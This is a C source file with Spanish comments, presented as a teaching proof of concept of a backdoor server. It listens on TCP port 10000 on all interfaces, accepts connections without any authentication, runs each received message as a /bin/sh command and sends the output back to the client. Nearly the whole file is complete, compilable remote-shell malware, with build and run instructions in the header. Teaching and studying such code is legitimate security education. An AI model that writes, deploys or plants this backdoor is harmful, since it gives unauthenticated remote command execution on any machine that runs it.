/**
 *  server_backdoor.c
 *
 *  Ejemplo de Puerta Trasera en C.
 *	Parte del Servidor.
 *
 *  Autor: Secu <secury@stationx11.es>
 *
 *  Desarrollado para el grupo de Programación
 *  en C de la seCta, y usado como PoC para la
 *	BitUp Talks18.
 *
 *	[+] Código en:
 *
 *  https://github.com/secu77/La-seCta/Malware/server_backdoor.c
 *
 *	[+] Referencias:
 *
 *	https://github.com/secu77/La-seCta/
 *	https://github.com/secu77/La-seCta/blob/master/hangouts/sockets_1/teoria/socketsordie.pdf
 *
 *	[+] Ejecución:
 *
 *	[zero@x11 seCta]$ gcc -Wall server_backdoor.c -o server_backdoor
 *	[zero@x11 seCta]$ ./server_backdoor
 *
 */


#include <stdio.h>			// La Principal, de siempre.
#include <stdlib.h>			// Para los exit().
#include <string.h>			// Para memset() y strlen().

#include <sys/socket.h>		// Para los sockets (pero puede omitirse).
#include <arpa/inet.h>		// Para INADDR_ANY, inet_ntoa() y las estructuras de sockets.

#include <time.h>			// Para obtener el tiempo.

#include <unistd.h>			// Para la pipe(), close().
#include <sys/wait.h>		// Para que el wait del Padre espere al exit del hijo (fork).

#define PUERTO 10000		// Puerto de escucha por defecto.
#define Ncox 2				// Se permitirán un máximo de 2 conexiones. (Backlog)
#define MAXMSG 2056			// Tamaño máximo del mensaje a recibir y mandar.



int main(int argc, char *argv[]){

	// Estructuras para el Socket Cliente y Servidor.
	struct sockaddr_in cliente, servidor;

	// Precalculando tamaños de la estructura genérica y la Sockaddr_in.
	unsigned int lensckadd = sizeof(struct sockaddr);
	unsigned int lens = sizeof(struct sockaddr_in);

	
	int recsocket = 0;				// Descriptor para el Socket Servidor.
	int recsock = 0;				// Descriptor para el Socket Cliente.

	unsigned int recvresp = 0;		// Para el nº de bytes que recibirá por el `recsocket`.
	

	// Mensaje de Bienvenida al Servidor.
	char msgbnv[] = "La seCta Backdoor! Dime algo bonito...";


	// Flag de conexión y salida.
	int conectado = 0;
	int right = 0;
	
	// 2056 bytes para el Buffer del mensaje a recibir.
	unsigned char buffersrv[MAXMSG];

	// Para mostrar el tiempo.
	time_t ttime;
	time(&ttime);

	// Para los Procesos.
	int pipfd[2];					// Para la tubería. [0] lectura, [1] escritura.
	int pid = 0;					// 
	unsigned int bytes = 0;			// Nº bytes que se recibirán por el `recsock`.
	char bufferp[MAXMSG];			// Como máximo leeremos un bloque de 2056 bytes.


	// Mera comprobación de parámetros.
	if(argc != 1){
		printf("\n[+]Uso: %s\n\n", argv[0]);
		exit(-1);
	}


	/*
	 *	Se crea el Socket, del tipo SOCK_STREAM para
	 *	conexiones TCP a través de Internet.
	 *
	 *	Se guarda el descriptor del socket (fichero),
	 *	para poder escribir posteriormente sobre él.
	 *
	 */
	if((recsocket = socket(AF_INET, SOCK_STREAM,0)) == -1){
		perror("socket()");
	}


	/*
	 *	Rellenando la estructura de
	 *	datos que nos servirán para
	 *	levantar y poner a la escucha
	 *	nuestro socket, y poder establecer
	 *	conexiones con otros sockets
	 *	clientes que se conecten al nuestro.
	 *
	 */
	servidor.sin_family = AF_INET;			// AF_INET indica conexiones a Internet.
	servidor.sin_port = htons(PUERTO);		// Convertimos el puerto a formato de Bytes de Red.
	servidor.sin_addr.s_addr = INADDR_ANY;	// Coloca nuestra IP automáticamente.
	memset(servidor.sin_zero,0,8);			// Rellenamos el resto de la estructura con ceros.


	/*
	 *	Al hacer un Bind, significa que asociamos
	 *	el socket que hemos creado anteriormente
	 *	a nuestro puerto a la escucha.
	 *
	 */
	if(bind(recsocket,(struct sockaddr*) &servidor, lensckadd) == -1){
		perror("bind()");
	}


	/*
	 *	Pone el Socket Servidor en proceso de
	 *	escucha, y establece el número de
	 *	conexiones del Backlog correspondiente
	 *	en la definición (debajo de los includes).
	 *
	 */
	if(listen(recsocket,Ncox) == -1){
		perror("listen()");
	}


	/*A la espera de una conexion*/
	while(!conectado){

		// Primer mensaje de Espera de conexión que se mostrará.
		printf("[+] Esperando conexión...\n");


		/*
		 *	Cuando un socket Cliente, solicite establecer una
		 *	conexión con nuestro Socket Servidor, si el Backlog,
		 *	nos lo permite (por el nº de conexiones), se aceptará
		 *	la conexión y se vinculará dicho Socket Cliente (fichero) al
		 *	descriptor `recsock`.
		 *
		 */
		if((recsock = accept(recsocket,(struct sockaddr *) &cliente, &lens)) == -1){
			perror("accept()");
		}else{

			/*
			 *	Cuando se conecta un Socket Cliente Nuevo 
			 *	se muestra el formato de tiempo actual y 
			 *	la IP de dicho cliente (importante transformar
			 *	el elemento de la estructura `sin_addr` a
			 *	cadena de carácteres (para ello inet_ntoa).
			 *
			 */
			printf("\n> %s",ctime(&ttime));
			printf("\n[*] Se conectó un cliente con IP: %s\n",inet_ntoa(cliente.sin_addr));


			// Enviando mensaje de bienvenida al Cliente.
			send(recsock,msgbnv,strlen(msgbnv),0);

			while(!right){

				/*
				 *	Se mantiene el flujo en espera en esta
				 *	parte porque (además de no ser un socket
				 *	non-blocking), aguarda a recibir el mensaje
				 *	por parte del Cliente. Y cuando lo reciba,
				 *	guardará el mensaje en el buffer `buffersrv`
				 *	y el nº de bytes leidos en `recvresp`.
				 *
				 */
				if((recvresp = recv (recsock, &buffersrv, sizeof (buffersrv), 0))>1){
					
					/*
					 *	Hemos declarado un Buffer de 2056 bytes,
					 *	pero eso no significa que el mensaje
					 *	vaya a contener ese nº de bytes, por ello
					 *	cortaremos el array con el delimitador de
					 *	cadena '\0', ya que si no lo hicieramos, a
					 *	la hora de procesar el mensaje, obtendríamos
					 *	basura. De esta forma sólo leeremos hasta el
					 *	\0, y fijaremos este gracias al nº de bytes
					 *	leidos `recvresp` que nos indica los que
					 *	realmente hay, es decir, puede que no cubran
					 *	los 2056, sino sólo 1000 o simplemente 3 bytes,
					 *	nosotros cortaremos por ese número leido.
					 *
					 */
					buffersrv[recvresp] = '\0';
					
					// Una mera salida del comando recibido.
					printf("\n< [%s]: %s",inet_ntoa(cliente.sin_addr),buffersrv);

					pipe(pipfd);			// Creando la tuberia.
					pid = fork();			// Creando el Proceso Hijo.

					if(pid < 0){
						perror("fork()");
					}else if(pid == 0){

						/*
						 *	Proceso Hijo:
						 *
						 *	Encargado de ejecutar el comando recibido por
						 *	el Socket Cliente, y mandar la salida de dicho
						 *	comando por la tubería al Proceso Padre.
						 *	Para mandar el STDOUT (salida) a la tubería
						 *	tendremos que duplicar la tabla de descriptores
						 *	y decirle que STDOUT vaya al descriptor de la Tubería.
						 *
						 */

						// Cerrando el modo lectura de la tuberia.
						close(pipfd[0]);

						// Duplicando el descriptor y mandando la salida a la tuberia.
						dup2(pipfd[1], 1);

						// Ya no se requiere el modo escritura, por la duplicación del descriptor.
						close(pipfd[1]);

						// Ejecutando el comando pasado por el buffer.
						execl("/bin/sh", "/bin/sh", "-c", buffersrv, NULL);

						perror("execve()");

					}else{

						/*
						 *  Proceso Padre:
						 *
						 *	Encargado de Recibir la salida del comando
						 *	y leer dicho contenido, delimitar y mandar
						 *	al Socket Cliente.
						 *
						 */


						/*
						 *	Esperando a que termine el proceso Hijo,
						 *	con el `execl` (todo correcto) o 
						 *	con el `perror` (en caso de error).
						 *
						 */
						wait(NULL);

						close(pipfd[1]);  // Cerrando el modo escritura en la tuberia del Padre.

				    
						// Leyendo de la tubería y cerrando por bytes leidos (como antes).
						bytes = read(pipfd[0], bufferp, sizeof(bufferp));
						bufferp[bytes] = '\0';

						// Enviando el mensaje de la salida del comando al Cliente.
						if((send(recsock, bufferp, sizeof(bufferp), 0)) == -1){
							printf("\nError al enviar el mensaje\n");
							exit(-1);
						}
						
						// Limpiando el Buffer. (memset pone la memoria a 0)
						memset(bufferp,0,sizeof(bufferp));
					}
					
					// Limpiando el Buffer. (memset pone la memoria a 0)
					memset(buffersrv,0,sizeof(buffersrv));
				
				}else{
					perror("recv");
					exit(0);
				}

			} // Cierre del While.
		}

		// Cerrando el Descriptor del Socket Cliente.
		close(recsock);
	}

	// Cerrando el Descriptor del Socket Servidor.
	close(recsocket);

	return 0;
}